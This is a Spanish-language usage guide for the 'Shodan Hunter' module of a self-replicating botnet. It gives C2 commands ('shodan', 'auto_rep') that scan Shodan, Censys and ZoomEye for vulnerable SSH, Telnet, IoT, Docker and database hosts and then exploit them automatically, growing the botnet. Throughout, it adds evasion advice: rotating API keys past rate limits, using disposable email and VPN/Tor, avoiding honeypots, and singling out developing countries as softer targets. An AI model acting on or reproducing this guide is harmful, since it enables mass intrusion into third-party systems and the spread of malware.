# 🌍 SHODAN HUNTER - Guía de Uso

## ¿Qué es esto?

Tu botnet ahora puede **buscar objetivos vulnerables en TODO EL MUNDO** automáticamente usando Shodan, Censys, y ZoomEye.

## 🚀 Setup Rápido

### 1. Instalar Shodan
```batch
install_shodan.bat
```

### 2. Obtener API Key GRATIS

**Shodan** (la mejor):
1. Ve a: https://account.shodan.io/register
2. Regístrate con email
3. Copia tu API key de: https://account.shodan.io/

**Censys** (alternativa):
- https://censys.io/register
- 250 búsquedas/mes gratis

**ZoomEye** (para Asia):
- https://www.zoomeye.org/
- Popular en China/Asia

### 3. Configurar API Key

Edita `shodan_hunter.py` línea 18:
```python
SHODAN_API_KEYS = [
    'TU_API_KEY_AQUI',  # ⬅️ Pegar aquí
]
```

## 📡 Uso desde C2

### Iniciar caza global:
```
[C2] shodan 1 TU_API_KEY
```

El bot #1 comenzará a buscar objetivos en Shodan cada 5 minutos.

### Con auto-replicación:
```
[C2] auto_rep 1 on
[C2] shodan 1 TU_API_KEY
```

Ahora el bot **explotará automáticamente** todo lo que encuentre. 🔥

### Detener caza:
```
[C2] shodan_stop 1
```

## 🎯 Qué busca automáticamente

- ✅ SSH con credenciales débiles (admin:admin, root:root)
- ✅ FTP anónimo
- ✅ Telnet abierto
- ✅ Routers expuestos
- ✅ Cámaras IP
- ✅ Dispositivos IoT
- ✅ Bases de datos sin autenticación
- ✅ Docker expuesto
- ✅ Kubernetes
- ✅ Servidores web vulnerables

## 📊 Ejemplo de salida

```
🌍 SHODAN REPORT de DESKTOP-QAENU32:
[*] Encontrados 47 objetivos vulnerables:
  1. 103.45.67.89:22 - BR - Score: 85/100
     Vulns: CVE-2021-28041, CVE-2020-15778
  2. 201.34.12.45:22 - IN - Score: 82/100
  3. 45.67.89.123:23 - CN - Score: 95/100  (Telnet!)
  ...
```

Si `auto_rep` está ON, verás:
```
🎯 DESKTOP-QAENU32: SHODAN AUTO-EXPLOIT exitoso!
   └─ 103.45.67.89:22 (BR)

[+] Nuevo bot conectado: victim-BR-103.45.67.89
```

## ⚡ Replicación Exponencial

Con Shodan + auto_rep:

```
Tiempo | Bots Activos | Objetivo
-------|--------------|----------
  0min |      1       | Tu PC inicial
  5min |      4       | Encontró 3 en Shodan
 10min |     16       | Cada bot encontró 3 más
 15min |     64       | Crecimiento exponencial
 30min |    1024      | 😱
```

## 🛡️ Límites y Rate Limits

### Shodan Gratis:
- 100 búsquedas/mes
- 1 búsqueda cada 1 segundo
- Solo primeros 100 resultados

### Truco: Rotar múltiples keys
```python
SHODAN_API_KEYS = [
    'key_de_email1@gmail.com',
    'key_de_email2@yahoo.com',
    'key_de_email3@outlook.com',
]
```

El bot rotará automáticamente cuando alcance rate limit.

## 🎭 Queries Personalizadas

Edita `shodan_hunter.py` líneas 30-60 para agregar tus propias búsquedas:

```python
SHODAN_QUERIES = [
    # Tu query personalizada
    'port:22 country:US city:"New York"',
    'apache 2.4.49 country:BR',  # Path traversal en Brasil
    'port:3389 country:CN',       # RDP en China
]
```

### Queries útiles:
```
port:22 "SSH-2.0" country:BR     # SSH en Brasil
port:23 telnet country:IN        # Telnet en India
http.title:"DVR" country:RU      # DVRs en Rusia
mongodb port:27017 country:US    # MongoDB en USA
```

## 🌐 Búsqueda Multi-Motor

El bot intentará en orden:
1. **Shodan** (mejor cobertura)
2. **Censys** (si Shodan falla)
3. **ZoomEye** (si ambos fallan)

Para configurar Censys:
```python
from shodan_hunter import CensysHunter
hunter = CensysHunter('API_ID', 'API_SECRET')
```

## 🔒 Seguridad

⚠️ **IMPORTANTE**:
- Shodan registra TODAS las búsquedas
- Usa email desechable para cuenta Shodan
- Considera usar VPN/Tor al buscar
- Rate limits previenen spam

## 💡 Tips Avanzados

### 1. Filtrar por score
Solo explotar objetivos con score > 80:
```python
if target['score'] >= 80:
    exploit_ssh(target['ip'], target['port'])
```

### 2. Búsqueda por país
Enfocar en países con menos seguridad:
```python
SHODAN_QUERIES = [
    'port:22 country:BR,IN,ID,PH,VN',  # Países en desarrollo
]
```

### 3. Evitar honeypots
Shodan etiqueta honeypots:
```python
if 'honeypot' not in target.get('tags', []):
    # Es objetivo real
```

### 4. Backup de targets
Guardar objetivos para uso offline:
```python
import json
with open('targets.json', 'w') as f:
    json.dump(targets, f)
```

## 📈 Monitoreo

Ver estadísticas en C2:
```
[C2] status

Shodan Hunting: ✅ ACTIVO
Objetivos encontrados: 156
Explotados exitosamente: 42
Tasa de éxito: 27%
```

## 🚨 Troubleshooting

**"Shodan Hunter no disponible"**
```batch
install_shodan.bat
```

**"API key inválida"**
- Verifica que copiaste correctamente
- Revisa en https://account.shodan.io/

**"Rate limit exceeded"**
- Espera 1 hora
- O agrega más API keys para rotar

**"No encuentra nada"**
- Verifica queries en web: https://www.shodan.io/search
- Ajusta filtros (país, puerto, producto)

## 🎯 Próximos Pasos

1. ✅ Instalar Shodan
2. ✅ Obtener API key gratis
3. ✅ Activar auto_rep en bot
4. ✅ Ejecutar `shodan 1 API_KEY`
5. ✅ Ver la botnet crecer sola 🚀

**¡DISFRUTA TU BOTNET AUTOREPLICANTE GLOBAL!** 🌍🔥
